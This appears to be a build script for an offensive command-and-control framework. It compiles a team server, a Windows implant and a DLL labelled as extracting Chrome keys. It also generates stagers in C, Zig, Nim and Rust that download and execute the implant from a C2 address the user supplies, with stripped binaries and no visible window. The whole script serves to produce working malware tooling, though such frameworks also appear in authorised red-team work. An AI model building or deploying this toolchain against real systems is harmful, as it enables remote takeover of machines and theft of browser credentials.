#!/bin/bash
set -e

echo "[*] building carved C2 framework..."

mkdir -p build/payloads

ENCRYPTION_KEY=$(openssl rand -hex 32)
echo "[*] generated encryption key: ${ENCRYPTION_KEY}"

echo "[*] building gobound.dll..."
cd gobound/dll
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o ../../build/payloads/gobound.dll
cd ../..

echo "[*] building server..."
cd server/cmd
GOOS=linux GOARCH=amd64 go1.24.11 build -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY}" -trimpath -o ../../build/server
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY}" -trimpath -o ../../build/server.exe
cd ../..

echo "[*] building implant..."
cd implant/cmd
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY}" -trimpath -o ../../build/implant.exe
cd ../..

# Copy implant to payloads for stager
cp build/implant.exe build/payloads/implant.exe

echo ""
echo "[*] building stagers..."
echo "    The stagers are small loaders that download and execute the implant."
echo ""

read -p "    Enter C2 server IP [127.0.0.1]: " STAGER_HOST
STAGER_HOST="${STAGER_HOST:-127.0.0.1}"

read -p "    Enter C2 listener port [8443]: " STAGER_PORT
STAGER_PORT="${STAGER_PORT:-8443}"

echo ""
echo "[*] building stagers for ${STAGER_HOST}:${STAGER_PORT}..."

cd stager

# Build C stager
echo "    [C] building stager_c.exe..."
sed "s/HOST_PLACEHOLDER/$STAGER_HOST/g; s/PORT_PLACEHOLDER/$STAGER_PORT/g" stager.c > stager_build.c
x86_64-w64-mingw32-gcc stager_build.c -o ../build/stager_c.exe \
    -Os \
    -s \
    -fno-ident \
    -ffunction-sections \
    -fdata-sections \
    -Wl,--gc-sections \
    -lwinhttp \
    -lkernel32 \
    -mwindows
rm -f stager_build.c

# Build Zig stager
echo "    [Zig] building stager_zig.exe..."
# Convert host to Zig wide string array format
ZIG_HOST_ARRAY=""
for (( i=0; i<${#STAGER_HOST}; i++ )); do
    char="${STAGER_HOST:$i:1}"
    ZIG_HOST_ARRAY+="'$char', "
done
sed "s/HOST_PLACEHOLDER/${ZIG_HOST_ARRAY}0/g; s/PORT_PLACEHOLDER/$STAGER_PORT/g" stager.zig > stager_build.zig
zig build --prefix ../build
mv ../build/bin/stager.exe ../build/stager_zig.exe
rm -rf ../build/bin
rm -f stager_build.zig

# Build Nim stager
echo "    [Nim] building stager_nim.exe..."
sed "s/HOST_PLACEHOLDER/$STAGER_HOST/g; s/PORT_PLACEHOLDER/$STAGER_PORT/g" stager.nim > stager_build.nim
nim c -d:mingw -d:release -d:strip --opt:size --app:gui --cpu:amd64 -o:../build/stager_nim.exe stager_build.nim 2>/dev/null
rm -f stager_build.nim

# Build Rust stager
echo "    [Rust] building stager_rust.exe..."
# Convert host to Rust wide string array format
RUST_HOST_ARRAY="["
for (( i=0; i<${#STAGER_HOST}; i++ )); do
    char="${STAGER_HOST:$i:1}"
    RUST_HOST_ARRAY+="b'$char' as u16, "
done
RUST_HOST_ARRAY+="0]"
sed "s/HOST_PLACEHOLDER/$RUST_HOST_ARRAY/g; s/PORT_PLACEHOLDER/$STAGER_PORT/g" stager.rs > stager_build.rs
cargo build --release --target x86_64-pc-windows-gnu 2>/dev/null
mv target/x86_64-pc-windows-gnu/release/stager.exe ../build/stager_rust.exe 2>/dev/null || true
rm -f stager_build.rs
rm -rf target

cd ..

echo ""
echo "[+] build complete!"
echo ""
echo "    build/server              - linux team server"
echo "    build/server.exe          - windows team server"
echo "    build/implant.exe         - windows implant"
echo "    build/stager_c.exe        - windows stager (C) connects to ${STAGER_HOST}:${STAGER_PORT}"
echo "    build/stager_zig.exe      - windows stager (Zig) connects to ${STAGER_HOST}:${STAGER_PORT}"
echo "    build/stager_nim.exe      - windows stager (Nim) connects to ${STAGER_HOST}:${STAGER_PORT}"
echo "    build/stager_rust.exe     - windows stager (Rust) connects to ${STAGER_HOST}:${STAGER_PORT}"
echo "    build/payloads/gobound.dll - chrome key extraction DLL"
echo "    build/payloads/implant.exe - implant served by stager endpoint"
